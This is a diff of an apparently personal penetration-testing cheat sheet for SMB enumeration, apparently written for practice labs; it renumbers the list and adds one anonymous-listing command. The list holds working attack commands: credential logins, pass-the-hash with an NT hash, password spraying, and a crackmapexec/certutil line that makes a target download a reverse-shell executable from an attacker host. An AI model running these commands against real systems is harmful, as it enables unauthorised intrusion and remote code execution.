@@ -97,42 +97,43 @@
 2. Nmap Scan: nmap --script "safe or smb-enum-*" -p 445 <IP>
 
 3. Shares: smbclient -L \\\\<IP>\\
+	1. smbclient -NL //$ip/ 
 
-4. Connect: smbclient -N //support.htb/support-tools
+5. Connect: smbclient -N //support.htb/support-tools
 
-5. Changing Shares: smbclient -L \\\\<IP>\\C$
+6. Changing Shares: smbclient -L \\\\<IP>\\C$
 
-6. Username/Domain/No Pass: smbclient \\\\$ip\\Public -U sequel/root
+7. Username/Domain/No Pass: smbclient \\\\$ip\\Public -U sequel/root
 
-7. Username/Password: smbclient //flight.htb/users -U svc_apache 'S@Ss!K@*t13'
+8. Username/Password: smbclient //flight.htb/users -U svc_apache 'S@Ss!K@*t13'
 
-8. Username/password/Domain: smbclient -L \\\\<IP>\\C$ -U <Domain>/<username>%<password>
+9. Username/password/Domain: smbclient -L \\\\<IP>\\C$ -U <Domain>/<username>%<password>
 
-9. $smbclient -L myhost -U DOMAIN/user -W workgroup
+10. $smbclient -L myhost -U DOMAIN/user -W workgroup
 
-10. Lists file with permissions: smbmap -H <IP>
+11. Lists file with permissions: smbmap -H <IP>
 
-11. Downloading: smbget -R smb://<IP>/anonymous
+12. Downloading: smbget -R smb://<IP>/anonymous
 
-12. type prompt off, recurse on -> lets us download all the files using mget *
+13. type prompt off, recurse on -> lets us download all the files using mget *
 
-13. Nmap Vuln Script: nmap --script "smb-vuln*" -p 139,445 <IP>
+14. Nmap Vuln Script: nmap --script "smb-vuln*" -p 139,445 <IP>
 
-14. crackmapexec smb <IP>
+15. crackmapexec smb <IP>
 
-15. Users: crackmapexec smb <IP> --users
+16. Users: crackmapexec smb <IP> --users
 
-16. Shares: crackmapexec smb <IP> --shares
+17. Shares: crackmapexec smb <IP> --shares
 
-17. Try Crackmapexec, psexec, smbexec, wmiexec
+18. Try Crackmapexec, psexec, smbexec, wmiexec
 
-18.  smbclient //10.20.85.111/Users -U SKYLARK/k.smith --pw-nt-hash d2a87ca4d6735870dc2357a83960c379
+19.  smbclient //10.20.85.111/Users -U SKYLARK/k.smith --pw-nt-hash d2a87ca4d6735870dc2357a83960c379
 
-19. impacket-smbclient  -hashes 00000000000000000000000000000000:d2a87ca4d6735870dc2357a83960c379 skylark/k.smith@10.20.109.111
+20. impacket-smbclient  -hashes 00000000000000000000000000000000:d2a87ca4d6735870dc2357a83960c379 skylark/k.smith@10.20.109.111
 
-20. crackmapexec smb 10.20.109.111 -u backup_service -p It4Server -x 'certutil -urlcache -split -f “http://192.168.45.188:8000/110reverse.exe” C:\110reverse.exe'
+21. crackmapexec smb 10.20.109.111 -u backup_service -p It4Server -x 'certutil -urlcache -split -f “http://192.168.45.188:8000/110reverse.exe” C:\110reverse.exe'
 
-21. crackmapexec smb $ip --shares -u usernames.txt -p passwords.txt --continue-on-success
+22. crackmapexec smb $ip --shares -u usernames.txt -p passwords.txt --continue-on-success
 
 ```
 
